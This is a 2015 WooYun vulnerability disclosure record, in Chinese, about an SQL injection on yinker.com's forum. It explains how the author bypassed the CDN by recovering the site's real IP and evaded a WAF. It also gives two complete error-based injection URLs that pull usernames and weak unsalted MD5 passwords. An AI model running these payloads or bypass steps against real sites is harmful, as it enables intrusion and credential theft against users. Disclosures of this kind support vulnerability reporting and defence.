{"id": 12823, "wybug_id": "wooyun-2015-0119325", "wybug_title": "银客网绕过加速乐绕过软waf注入获得所有用户密码", "wybug_corp": "yinker.com", "wybug_author": "s0mun5", "wybug_date": "2015-06-09 18:47", "wybug_open_date": "2015-07-26 18:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向公众公开  简要描述： 银客网绕过加速乐绕过软waf注入获得所有用户密码 详细说明：  首先找到一个子域名 http://bbs.yinker.com实际上这套系统存在注入漏洞\n\n然而不巧的是 这个站使用了加速乐的服务\n\n第一步绕过这个加速乐那么就找到真实ip 怎么找 ？用百度\n\n这个缓存为1月份的 还没有使用加速乐 看到了真实的ip\n\nok 绑定host 加速乐就绕过了101.251.206.198 bbs.yinker.com   漏洞证明：  第二步 发现软waf过滤了 * concat 都关键词union注入不可用 bool太慢 time太慢sqlmap总会触发规则使用一个奇怪的报错语句成功\n\n分析这套系统的代码可以知道 密码做了多次加密 并存用户名 salt 都使用在了加密中 无法简单的进行解密但是经过大量尝试后发现 用户在主站注册的时候，密码会直接同步到这个站的数据库中，并且不存在salt，为主站密码的直接md5。注意 是 实时同步 只要注册马上同步过来那么使用下面的猥琐欲局，就拿到了所有用户的一次md5密码\nhttp://bbs.yinker.com/?/topic/ajax/question_list/type-best&topic_id=1) and (select!x-~0.FROM(select+(select user_name from aws_users where salt is NULL limit 0,1)x)f)--+\n只要不存在salt的全部为主站同步过来的用户\n\n用户35w+我们也可以用一个猥琐的方式快速获得大量存在弱密码的用户比如密码为 yinker.com 的md5是 f9c6198fac090e1eadc2dd7e66a840f4则语句为\nhttp://bbs.yinker.com/?/topic/ajax/question_list/type-best&topic_id=1) and (select!x-~0.FROM(select+(select user_name from aws_users where salt is NULL and password='f9c6198fac090e1eadc2dd7e66a840f4' limit 0,1)x)f)--+\n\n\n然后我们可以成功登陆这个用户\n\n所有用户可能受到威胁   修复方案：  进行更为严密过滤 更换真实ip   版权声明：转载请注明来源 s0mun5@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-06-11 18:10 厂商回复： 感谢提供的漏洞信息，我们会尽快处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-09 18:48 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:31        | 学习)\t\t \n  我猜是绑hosts～    \n     2015-06-09 18:53 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  好碉呢    \n     2015-06-11 18:45 |    \t\ts0mun5  \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:24        | .)\t\t \n  为了公关么 rank给的这么低（哭    \n     2015-07-26 18:36 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 逆流而上，顺势而为)\t\t \n  66666    \n     2015-07-26 21:27 |    \t\taotedan \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:3        | 求收编，本人会注入，会上传，会Xss，会破...)\t\t \n  加速乐怎么处理？    \n     2015-07-27 11:16 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  @s0mun5 干的漂亮啊 rack低了    \n     2015-08-07 09:06 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  厉害啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}